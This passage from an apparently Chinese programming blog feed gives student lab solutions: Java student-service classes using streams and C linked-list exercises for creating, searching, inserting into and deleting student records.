class="line">                    ));</span><br><span class="line">            studentService.mapStudentsBySex().get(Student.Sex.FEMALE).forEach(u-&gt; System.out.println(u.getId()+&quot; &quot;</span><br><span class="line">                            +u.getName()+&quot; &quot;</span><br><span class="line">                            +u.getYear()+&quot; &quot;</span><br><span class="line">                            +u.getSex()+&quot; &quot;</span><br><span class="line">                    ));</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            ///e.printStackTrace();</span><br><span class="line">            System.out.println(&quot;有个空了&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        ///5.删除指定学号的学生，返回是否成功删除</span><br><span class="line">        System.out.println(&quot;----------------5.删除指定学号的学生，返回是否成功删除--------------------&quot;);</span><br><span class="line"></span><br><span class="line">        System.out.println(studentService.removeStudent(201002));</span><br><span class="line">        ((StudentServiceImpl) studentService).studentList.forEach(u-&gt; System.out.println(u.getId()+&quot; &quot;</span><br><span class="line">                +u.getName()+&quot; &quot;</span><br><span class="line">                +u.getYear()+&quot; &quot;</span><br><span class="line">                +u.getSex()+&quot; &quot;</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="StudentServiceImpl"><a href="#StudentServiceImpl" class="headerlink" title="StudentServiceImpl"></a>StudentServiceImpl</h4><p><code>bash</code><br>package com.experiment04.service.impl;</p><p>import com.experiment04.entity.Student;<br>import com.experiment04.resource.DatabaseUtils;<br>import com.experiment04.service.StudentService;</p><p>import java.util.ArrayList;<br>import java.util.HashMap;<br>import java.util.List;<br>import java.util.Map;<br>import java.util.concurrent.atomic.AtomicBoolean;<br>import java.util.stream.Collectors;<br>import java.util.stream.Stream;</p><p>public class StudentServiceImpl  implements StudentService {<br>    public List<Student>studentList=new ArrayList<Student>();<br>    我多加了个初始值方便测<br>    public void util() {<br>        ///qingkong<br>        studentList.removeIf(u-&gt;{<br>            return true;<br>        });<br>        studentList.add(new Student(201001, Student.Sex.FEMALE, “赵阳阳”, 2010));</p><pre><code>    studentList.add(new Student(201002, Student.Sex.MALE, &quot;邵鹏&quot;, 2010));    studentList.add(new Student(201103, Student.Sex.MALE, &quot;高学斌&quot;, 2011));    studentList.add(new Student(201104, Student.Sex.MALE, &quot;张扬&quot;, 2011));    studentList.add(new Student(201205, Student.Sex.FEMALE, &quot;吕惠玲&quot;, 2012));    studentList.add(new Student(201206, Student.Sex.MALE, &quot;曾志优&quot;, 2012));&#125;@Overridepublic List&lt;Student&gt; addStudent(Student student) &#123;    studentList.add(student);    return studentList;&#125;@Overridepublic List&lt;Student&gt; listStudentsByYear(int year) &#123;    List&lt;Student&gt;studentsYear=new ArrayList&lt;Student&gt;();    /*studentList.forEach(u-&gt;&#123;        if(u.getYear()==year)        &#123;            studentsYear.add(u);        &#125;    &#125;);*/    Stream&lt;Student&gt;stream =DatabaseUtils.getStudents().stream();    Stream&lt;Student&gt;newstream= stream.filter(s-&gt;&#123;       if(s.getYear()==year)&#123;           return true;       &#125;       return false;    &#125;);    studentsYear=newstream.collect(Collectors.toList());    return studentsYear;&#125;@Overridepublic List&lt;String&gt; listStudentsNames(int year, Student.Sex sex) &#123;    List &lt;String&gt;yearSearchList=new ArrayList&lt;String&gt;();    studentList.forEach(u-&gt;&#123;        if(u.getYear()==year &amp;&amp; u.getSex()==sex)        &#123;            yearSearchList.add(u.getName());        &#125;    &#125;);    return yearSearchList;&#125;@Overridepublic Map&lt;Student.Sex, List&lt;Student&gt;&gt; mapStudentsBySex() &#123;    Map&lt;Student.Sex,List&lt;Student&gt;&gt; map=new HashMap&lt;&gt;();    map.put(Student.Sex.MALE,new ArrayList&lt;Student&gt;());    map.put(Student.Sex.FEMALE,new ArrayList&lt;Student&gt;());    studentList.forEach(u-&gt;&#123;        if(u.getSex()== Student.Sex.MALE)&#123;            map.get(Student.Sex.MALE).add(u);        &#125;        if(u.getSex()== Student.Sex.FEMALE)&#123;            map.get(Student.Sex.FEMALE).add(u);        &#125;    &#125;);    return map;&#125;@Overridepublic boolean removeStudent(int id) &#123;</code></pre><p>//AtomicBoolean flag= new AtomicBoolean(false);<br>       /*  studentList=studentList.stream().filter(i-&gt;{<br>            if(i.getId()!=id){</p><pre><code>            return true;        &#125;        return false;    &#125;).collect(Collectors.toList());    return true;    *//*return  studentList.removeIf(u-&gt;&#123;        if(u.getId()==id)        &#123;            return true;        &#125;        return false;    &#125;);*//*</code></pre><p>*/return DatabaseUtils.getStudents().removeIf(s-&gt;s.getId()==id);</p><pre><code>&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#### DatabaseUtils</span><br><span class="line">```bash```</span><br><span class="line">package com.experiment04.resource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.experiment04.entity.Student;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class DatabaseUtils &#123;</span><br><span class="line"></span><br><span class="line">    private static final List&lt;Student&gt; STUDENTS = create();</span><br><span class="line"></span><br><span class="line">    private static List&lt;Student&gt; create() &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Student&gt; students = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201001, Student.Sex.FEMALE, &quot;赵阳阳&quot;, 2010));</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201002, Student.Sex.MALE, &quot;邵鹏&quot;, 2010));</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201103, Student.Sex.MALE, &quot;高学斌&quot;, 2011));</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201104, Student.Sex.MALE, &quot;张扬&quot;, 2011));</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201205, Student.Sex.FEMALE, &quot;吕惠玲&quot;, 2012));</span><br><span class="line"></span><br><span class="line">        students.add(new Student(201206, Student.Sex.MALE, &quot;曾志优&quot;, 2012));</span><br><span class="line"></span><br><span class="line">        return students;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static List&lt;Student&gt; getStudents() &#123;</span><br><span class="line"></span><br><span class="line">        return STUDENTS;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="StudentService"><a href="#StudentService" class="headerlink" title="StudentService"></a>StudentService</h4><p><code>bash</code></p><p>package com.experiment04.service;<br>import com.experiment04.entity.Student;<br>import com.experiment04.resource.DatabaseUtils;</p><p>import java.util.List;<br>import java.util.Map;</p><p>public interface StudentService {</p><pre><code>/** * 向集合添加一个学生，返回当前全部学生 * @param student * @return */List&lt;Student&gt; addStudent(Student student);/** * 返回指定届的全部学生 * @param year * @return */List&lt;Student&gt; listStudentsByYear(int year);/** * 返回指定届，指定性别的全部学生的姓名 * @param year * @param sex * @return */List&lt;String&gt; listStudentsNames(int year, Student.Sex sex);/** * 将所有学生，以性别分组 * @return */Map&lt;Student.Sex, List&lt;Student&gt;&gt; mapStudentsBySex();/** * 删除指定学号的学生，返回是否成功删除 * @param id * @return */boolean removeStudent(int id);</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">#### Student</span><br><span class="line"></span><br><span class="line">```bash```</span><br><span class="line">package com.experiment04.entity;</span><br><span class="line">public class Student &#123;</span><br><span class="line">    public enum Sex &#123;</span><br><span class="line"></span><br><span class="line">        MALE, FEMALE</span><br><span class="line">    &#125;</span><br><span class="line">    private int id;</span><br><span class="line"></span><br><span class="line">    private Sex sex;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    // 例如2017级</span><br><span class="line"></span><br><span class="line">    private int year;</span><br><span class="line"></span><br><span class="line">    public Student(int id, Sex sex, String name, int year) &#123;</span><br><span class="line"></span><br><span class="line">        this.id = id;</span><br><span class="line"></span><br><span class="line">        this.sex = sex;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">        this.year = year;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    下面全是set get</span><br><span class="line">    public int getId() &#123;</span><br><span class="line"></span><br><span class="line">        return id;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line"></span><br><span class="line">        this.id = id;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public Sex getSex() &#123;</span><br><span class="line"></span><br><span class="line">        return sex;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void setSex(Sex sex) &#123;</span><br><span class="line"></span><br><span class="line">        this.sex = sex;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line"></span><br><span class="line">        return name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public int getYear() &#123;</span><br><span class="line"></span><br><span class="line">        return year;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void setYear(int year) &#123;</span><br><span class="line"></span><br><span class="line">        this.year = year;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 10</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-10/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-10/</url>
      
        <content type="html"><![CDATA[<h4 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h4><h5 id="10-十一-链表3-基本应用"><a href="#10-十一-链表3-基本应用" class="headerlink" title="10.十一. 链表3-基本应用"></a>10.十一. 链表3-基本应用</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>链表的创建（1）：根据读入的学生信息，利用尾插法创建链表。学生的信息包括：学号（unsigned int）、姓名（char [20]，不含空格）、3门课的成绩（double），平均成绩和总成绩，其中每个学生的平均成绩和总成绩由前面读入的数值通过计算得到（均保留2位小数）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    unsigned int num;</span><br><span class="line">    char name[25];</span><br><span class="line">    double classa;</span><br><span class="line">    double classb;</span><br><span class="line">    double classc;</span><br><span class="line">    double aver;</span><br><span class="line">    double sum;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    struct stu *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,</span><br><span class="line">p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">            p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">            p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%u  %s  %.2lf  %.2lf  %.2lf  %.2lf  %.2lf\n&quot;</span>,p-&gt;num,p-&gt;name,</span><br><span class="line">p-&gt;classa,p-&gt;classb,p-&gt;classc,p-&gt;aver,p-&gt;sum);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>链表中数据的查找：利用前面的第一题创建链表，现要求写一个函数完成，按学号查找数据，在主函数中输出，如果找到了，这输出该数据在链表中的位置(利用w存放位置)，如果没找到则输出0。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    unsigned int num;</span><br><span class="line">    char name[25];</span><br><span class="line">    double classa;</span><br><span class="line">    double classb;</span><br><span class="line">    double classc;</span><br><span class="line">    double aver;</span><br><span class="line">    double sum;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,l,flag;</span><br><span class="line">    unsigned findnum;</span><br><span class="line">    struct stu *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">            p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">            p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf(<span class="string">&quot;%u&quot;</span>,&amp;findnum);</span><br><span class="line">        l=0;</span><br><span class="line">        flag=0;</span><br><span class="line">        p=head;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            l++;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num==findnum)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=1;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  %u  %s  %.2lf  %.2lf  %.2lf  %.2lf  %.2lf\n&quot;</span>,l,p-&gt;num,p-&gt;name,</span><br><span class="line">p-&gt;classa,p-&gt;classb,p-&gt;classc,p-&gt;aver,p-&gt;sum);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==0) <span class="built_in">printf</span>(<span class="string">&quot;0\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h3><p>有序链表的插入：通过输入学号有序的序列，利用尾插法建立链表。在创建完且学号有序的链表中插入一个新学生信息，使得插入后的链表仍然按照学号有序排列。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    unsigned int num;</span><br><span class="line">    char name[25];</span><br><span class="line">    double classa;</span><br><span class="line">    double classb;</span><br><span class="line">    double classc;</span><br><span class="line">    double aver;</span><br><span class="line">    double sum;</span><br><span class="line">    struct stu *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    int flag=0;</span><br><span class="line">    struct stu *head,*q,*p;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=0;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">            scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">            p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">            p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            q=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        p=(struct stu *)malloc(sizeof(struct stu));</span><br><span class="line">        scanf(<span class="string">&quot;%u %s %lf %lf %lf&quot;</span>,&amp;p-&gt;num,p-&gt;name,&amp;p-&gt;classa,&amp;p-&gt;classb,&amp;p-&gt;classc);</span><br><span class="line">        p-&gt;sum=(p-&gt;classa+p-&gt;classb+p-&gt;classc);</span><br><span class="line">        p-&gt;aver=(p-&gt;sum)/3.0;</span><br><span class="line">        p-&gt;next=NULL;</span><br><span class="line">        q=head;</span><br><span class="line">        struct stu *be;</span><br><span class="line">        be=head;</span><br><span class="line">        <span class="keyword">while</span>(q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((q-&gt;num)&gt;(p-&gt;num))</span><br><span class="line">            &#123;</span><br><span class="line">                flag=1;</span><br><span class="line">                <span class="keyword">if</span>(q==head)</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;next=head-&gt;next;</span><br><span class="line">                    struct stu *t;</span><br><span class="line">                    t=head;</span><br><span class="line">                    head=p;</span><br><span class="line">                    p=t;</span><br><span class="line">                    head-&gt;next=p;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;next=be-&gt;next;</span><br><span class="line">                    be-&gt;next=p;</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(q-&gt;next==NULL &amp;&amp; flag==0)</span><br><span class="line">            &#123;</span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            be=q;</span><br><span class="line">            q=q-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=head;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%u  %s  %.2lf  %.2lf  %.2lf  %.2lf  %.2lf\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;classa,</span><br><span class="line"></span><br><span class="line">p-&gt;classb,p-&gt;classc,p-&gt;aver,p-&gt;sum);</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、"><a href="#4、" class="headerlink" title="4、"></a>4、</h3><p>链表的删除：在前面的第一题创建完的链表中按照学号删除一个学生的信息。(注：学号唯一)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct stu&#123;</span><br><span class="line">    unsigned int num;</span><br><span class="line">    char name[25];</span><br><span class="line">    double classa;</span><br><span class="line">    double classb;</span><br><span class="line">    double 